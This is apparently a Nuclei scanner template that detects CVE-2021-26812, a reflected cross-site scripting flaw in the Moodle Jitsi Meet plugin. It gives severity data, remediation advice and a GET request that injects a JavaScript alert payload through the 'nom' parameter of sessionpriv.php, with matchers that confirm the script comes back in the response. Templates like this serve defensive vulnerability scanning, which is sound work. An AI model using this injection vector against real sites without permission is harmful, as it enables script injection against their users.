id: CVE-2021-26812

info:
  name: Moodle Jitsi Meet 2.7-2.8.3 - Cross-Site Scripting
  author: aceseven (digisec360)
  severity: medium
  description: Moodle Jitsi Meet 2.7 through 2.8.3 plugin contains a cross-site scripting vulnerability via the "sessionpriv.php" module. This allows attackers to craft a malicious URL, which when clicked on by users, can inject JavaScript code to be run by the application.
  remediation: |
    Update to the latest version of the Moodle Jitsi Meet plugin to mitigate the XSS vulnerability.
  reference:
    - https://github.com/udima-university/moodle-mod_jitsi/issues/67
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26812
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-26812
    cwe-id: CWE-79
    epss-score: 0.00633
    epss-percentile: 0.7669
    cpe: cpe:2.3:a:jitsi:meet:*:*:*:*:*:moodle:*:*
  metadata:
    max-request: 1
    vendor: jitsi
    product: meet
    framework: moodle
  tags: cve,cve2021,moodle,jitsi,xss,plugin

http:
  - method: GET
    path:
      - "{{BaseURL}}/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "alert(document.domain);"

      - type: word
        part: header
        words:
          - "MoodleSession"

      - type: status
        status:
          - 200
# digest: 490a00463044022022f3f838564ac71f4fe67ac0c8e5c4eb0ccb13bdd49f75a7d10000bedf81c2db022061a3aabf018b0e2f60ff7d2a4c3db6f5f9258c00a296073cea147a31eac6a443:922c64590222798bb761d5b6d8e72950